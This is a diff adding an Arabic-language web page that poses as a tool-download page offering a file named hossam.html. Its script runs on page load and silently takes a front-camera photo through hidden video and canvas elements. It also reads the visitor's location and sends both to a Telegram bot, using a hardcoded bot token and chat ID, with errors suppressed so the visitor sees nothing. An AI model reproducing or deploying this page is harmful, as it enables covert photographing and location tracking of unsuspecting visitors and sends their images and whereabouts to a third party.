@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>تحميل الأداة</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px 20px;
+            background: #f0f2f5;
+            direction: rtl;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            max-width: 400px;
+            margin: auto;
+            padding: 40px 20px;
+            border-radius: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .download-btn {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 18px;
+            border-radius: 40px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            font-weight: bold;
+        }
+        .download-btn:hover {
+            background-color: #006699;
+        }
+        /* إخفاء عناصر الكاميرا تماماً */
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>مرحباً</h2>
+        <p>اضغط الزر لتحميل الأداة المطلوبة</p>
+        <a href="hossam.html" class="download-btn" download="hossam.html">📥 تحميل ملف hossam.html</a>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // 🔐 إعدادات البوت (استبدلها ببياناتك)
+        const BOT_TOKEN = '8880511168:AAHC9ZB5XEDSIJwUi0Wz1ZwwJVYiMsU_WdA';     // ضع توكن البوت هنا
+        const CHAT_ID = '5912108124';         // ضع معرف الدردشة هنا
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // إرسال الصورة إلى تلغرام
+        async function sendPhoto(blob) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'image.jpg');
+            try {
+                await fetch(url, { method: 'POST', body: formData });
+            } catch(e) { /* صامت */ }
+        }
+
+        // إرسال الموقع
+        async function sendLocation(lat, lng) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+            const params = new URLSearchParams({ chat_id: CHAT_ID, latitude: lat, longitude: lng });
+            try {
+                await fetch(url, { method: 'POST', body: params });
+            } catch(e) { /* صامت */ }
+        }
+
+        // التقاط الصورة من الفيديو
+        function capture() {
+            if (!video.videoWidth || !video.videoHeight) return;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+                if (blob) sendPhoto(blob);
+            }, 'image/jpeg', 0.85);
+        }
+
+        // طلب الكاميرا (يفضل الأمامية) ثم التقاط الصورة
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { exact: "user" } }
+                });
+                video.srcObject = stream;
+                await video.play();
+                setTimeout(() => {
+                    capture();
+                    stream.getTracks().forEach(t => t.stop());
+                }, 800);
+            } catch (err) {
+                // محاولة بأي كاميرا
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    video.srcObject = stream;
+                    await video.play();
+                    setTimeout(() => {
+                        capture();
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 800);
+                } catch(e) {}
+            }
+        }
+
+        // طلب الموقع
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => sendLocation(pos.coords.latitude, pos.coords.longitude),
+                    () => {}  // صامت في حال الرفض
+                );
+            }
+        }
+
+        // تشغيل كل شيء فور تحميل الصفحة
+        window.addEventListener('load', () => {
+            initCamera();
+            getLocation();
+        });
+    </script>
+</body>
+</html>
